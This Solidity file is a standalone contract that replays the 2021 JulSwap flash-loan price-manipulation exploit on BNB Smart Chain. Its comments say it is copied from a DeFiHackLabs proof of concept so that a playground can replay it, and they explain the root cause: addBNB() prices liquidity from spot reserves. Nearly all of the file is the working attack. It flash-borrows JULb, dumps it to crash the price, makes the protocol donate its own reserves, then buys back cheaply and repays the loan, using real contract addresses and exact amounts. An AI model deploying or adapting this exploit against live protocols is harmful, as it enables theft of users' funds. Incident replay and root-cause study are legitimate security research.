// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Synthetic standalone exploit for the EVM Playground (2021-05-JulSwap).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// BSCswap flash-swap callback `BSCswapCall` lives on the test itself, so there is
// no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + BSCswapCall + receive) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/JulSwap_exp.sol.
//
// Root cause: JulProtocolV2.addBNB() sizes its JULb liquidity contribution from the
// pool's instantaneous (spot) reserves via BSCswapLibrary.quote() with no oracle /
// TWAP / caller slippage guard. The attacker crashes the JULb price with a flash-
// borrowed dump, then calls addBNB so the protocol pairs its OWN JULb inventory at
// the manipulated (cheap) rate, donates value into the pool, and buys the JULb back
// cheaply to repay the flash loan — netting the BNB difference.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IBNBRouter {
    function swapExactTokensForBNB(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapBNBForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

interface IJulProtocolV2 {
    function addBNB() external payable;
}

contract JulSwapDrain {
    address constant BSCSWAP_PAIR = 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7; // JULb flash-loan source
    address constant JULb = 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ROUTER = 0xbd67d157502A23309Db761c41965600c2Ec788b2; // BSCswapRouter02
    address constant JUL_PROTOCOL_V2 = 0x41a2F9AB325577f92e8653853c12823b35fb35c4; // vulnerable addBNB()

    // Step 0: flash-borrow 70,000 JULb from the unrelated JULb pair. Non-empty data
    // makes this a flash swap — JULb is sent before repayment, then the pair calls
    // back BSCswapCall(...) on this contract.
    function run() external {
        uint256 amount0Out = 70_000 ether; // 70,000 JULb
        IUniswapV2Pair(BSCSWAP_PAIR).swap(amount0Out, 0, address(this), "1");
    }

    // Flash-swap callback. The borrowed JULb is already in this contract's balance.
    function BSCswapCall(address, uint256 amount0, uint256, bytes memory) external {
        // Step 1: approve the router, then dump the 70,000 JULb into the JULb/WBNB
        // pool via swapExactTokensForBNB. This crashes the JULb price ~5.6x and
        // extracts ~1,400.15 WBNB (unwrapped to native BNB, sent here).
        IERC20(JULb).approve(ROUTER, type(uint256).max);

        address[] memory path0 = new address[](2);
        path0[0] = JULb;
        path0[1] = WBNB;
        IBNBRouter(ROUTER).swapExactTokensForBNB(amount0, 1, path0, address(this), 1_622_156_211);

        // Step 2: call addBNB{value: 515 ether}. Because JULb is now artificially
        // cheap, the protocol sizes its JULb contribution from the manipulated spot
        // reserves (quote(515, WBNB=303.41, JULb=85,123) = 144,487 JULb) and pairs
        // its OWN inventory + 515 BNB into the depleted pool — donating value.
        IJulProtocolV2(JUL_PROTOCOL_V2).addBNB{value: 515 ether}();

        // Step 3: buy exactly 70,310.63 JULb back cheaply (only 362.31 WBNB needed
        // of the 885.15 sent). The router refunds the unused 522.84 WBNB dust here.
        uint256 amountOut = 70_310_631_895_687_061_183_551;
        address[] memory path1 = new address[](2);
        path1[0] = WBNB;
        path1[1] = JULb;
        IBNBRouter(ROUTER).swapBNBForExactTokens{value: 885.146882180525770269 ether}(
            amountOut, path1, address(this), 1_622_156_211
        );

        // Step 4: repay the flash loan (70,000 principal + 0.3% fee = 70,210.63 JULb).
        IERC20(JULb).transfer(BSCSWAP_PAIR, 70_210_631_895_687_061_183_551);
    }

    // Required to receive native BNB (the swap refund + unwrapped WBNB).
    receive() external payable {}
}
